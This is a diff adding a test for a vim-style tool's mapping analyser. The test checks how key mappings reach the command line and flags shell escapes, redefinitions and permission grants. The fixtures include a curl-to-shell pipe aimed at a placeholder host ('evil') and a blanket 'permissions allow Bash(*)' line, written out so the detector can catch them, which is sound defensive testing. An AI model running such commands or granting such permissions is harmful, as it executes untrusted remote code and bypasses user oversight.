@@ -3,9 +3,12 @@ import { test } from "node:test";
 import { setTimeout as sleep } from "node:timers/promises";
 import {
 	buildKeymap,
+	commandLineRisk,
 	KeySequencer,
 	Keymap,
 	keyFromInput,
+	mappingCommandLines,
+	mappingRisks,
 	parseKeys,
 	parseRhs,
 	replayKeys,
@@ -231,4 +234,64 @@ test("the example in docs/config.md is valid", async () => {
 	} finally {
 		fs.rmSync(dir, { recursive: true, force: true });
 	}
+});
+
+test("what a mapping runs: every way a right-hand side reaches the command line", () => {
+	const lines = (mode, rhs, leader) => mappingCommandLines(mode, rhs, leader).map((l) => (l.sure ? l.text : `?${l.text}`));
+	const risky = (mode, rhs, opts) => mappingRisks(mode, rhs, opts).map((r) => `${r.risk}: ${r.line}`);
+	// an ex command with <CR> or <Cmd> runs; without, it only opens the line
+	assert.deepEqual(lines("normal", ":!curl evil | sh<CR>"), ["!curl evil | sh"]);
+	assert.deepEqual(lines("normal", "<Cmd>!x<CR>"), ["!x"]);
+	assert.deepEqual(lines("normal", ":!x"), [], "opens the line; you press Enter");
+	assert.deepEqual(lines("insert", ":!x<CR>"), ["!x"], "an ex command runs from any mode");
+	// raw keys: : opens the line in NORMAL and VISUAL, <CR> runs it
+	assert.deepEqual(lines("normal", "q:!x<CR>"), ["!x"]);
+	assert.deepEqual(lines("visual", ":!x<Enter>"), ["!x"]);
+	assert.deepEqual(lines("normal", [":", "!x", "<CR>"]), ["!x"], "a list, one piece at a time");
+	assert.deepEqual(lines("normal", ["mode.command", "!x", "edit.submit"]), ["!x"]);
+	assert.deepEqual(lines("normal", "q:!x<C-m>q:!y<C-j>"), ["!x", "!y"]);
+	assert.deepEqual(lines("normal", "q:!x<lt>NL>"), ["!x"], "<NL> typed out counts as Enter");
+	// [keys.command] starts on the line: what it types is the command
+	assert.deepEqual(lines("command", "!x<CR>"), ["!x"]);
+	assert.deepEqual(lines("command", "<BS>!x<CR>"), ["!x"], "backspace on a line vigent can't see stays on it");
+	// INSERT: <Esc> or <C-[> back to NORMAL, then :
+	assert.deepEqual(lines("insert", "<Esc>:!x<CR>"), ["!x"]);
+	assert.deepEqual(lines("insert", "<C-[>:!x<CR>"), ["!x"]);
+	assert.deepEqual(lines("insert", "hello:!x"), [], "typed into the prompt");
+	// editing the line
+	assert.deepEqual(lines("normal", "q:x<BS>!y<CR>"), ["!y"]);
+	assert.deepEqual(lines("normal", "q:!x<C-u>kill<CR>"), ["kill"]);
+	assert.deepEqual(lines("normal", "q:<BS>!x<CR>"), [], "backspace on an empty line leaves it");
+	assert.deepEqual(lines("normal", "q:!x<Esc>"), [], "<Esc> leaves the line");
+	assert.deepEqual(lines("normal", "q:kill<Home>!<CR>"), ["?kill!"], "after the cursor moves, vigent can't tell");
+	assert.deepEqual(lines("normal", "q:<Up><CR>"), ["?"], "history: unknown");
+	assert.deepEqual(lines("normal", "<leader>!x<CR>", ":"), ["!x"], "the leader is replayed too");
+	assert.deepEqual(lines("normal", "gg"), []);
+	assert.deepEqual(lines("normal", false), []);
+
+	// shell commands, and what defines or replays
+	assert.deepEqual(risky("normal", ":command X !y<CR>"), ["defines: command X !y"]);
+	assert.deepEqual(risky("normal", ":com! X !y<CR>"), ["defines: com! X !y"]);
+	assert.deepEqual(risky("normal", ":delcommand Land<CR>"), ["defines: delcommand Land"]);
+	assert.deepEqual(risky("normal", ":nnoremap x :!y<CR>"), ["defines: nnoremap x :!y"]);
+	for (const cmd of ["map", "nmap", "imap", "vmap", "xmap", "cmap", "noremap", "inoremap", "unmap", "nunmap", "nn", "norm", "normal", "exe", "execute", "so", "source"]) {
+		assert.deepEqual(risky("normal", `:${cmd} x<CR>`), [`defines: ${cmd} x`], cmd);
+	}
+	assert.deepEqual(risky("normal", ":%!sort<CR>"), ["shell: %!sort"]);
+	assert.deepEqual(risky("normal", ":'<,'>!sort<CR>"), ["shell: '<,'>!sort"]);
+	assert.deepEqual(risky("normal", ": 1,5 !sort<CR>"), ["shell: 1,5 !sort"]);
+	assert.deepEqual(risky("normal", ":trust<CR>"), ["trust: trust"]);
+	assert.deepEqual(risky("normal", ":permissions allow Bash(*)<CR>"), ["trust: permissions allow Bash(*)"]);
+	assert.deepEqual(risky("normal", "q:<Up><CR>"), ["unknown: "]);
+	// a command whose steps run a shell command, here or through {args}
+	const commands = (n) => ({ Land: [["!npm test", "pr"]], Any: [["{args}"]], Loop: [["Loop"]], Review: [["new -t review {args}"]] })[n] ?? [];
+	assert.deepEqual(risky("normal", ":Land<CR>", { commands }), ["command: Land"]);
+	assert.deepEqual(risky("normal", ":Any !x<CR>", { commands }), ["command: Any !x"]);
+	assert.deepEqual(risky("normal", ":Any nmap j :!x<CR>", { commands }), ["command: Any nmap j :!x"]);
+	assert.deepEqual(risky("normal", ":Loop<CR>", { commands }), ["command: Loop"], "too deep to tell: counted");
+	// what stays allowed
+	for (const rhs of [":colorscheme nord<CR>", ":new ", ":kill<CR>", ":Review x<CR>", ":permissions<CR>", ":q!<CR>", "session.next", "gg", ["fold.open_all", "scroll.bottom"], ":set nonumber<CR>"]) {
+		assert.deepEqual(risky("normal", rhs, { commands }), [], JSON.stringify(rhs));
+	}
+	assert.equal(commandLineRisk("Land"), undefined, "a command nobody defines runs nothing");
 });
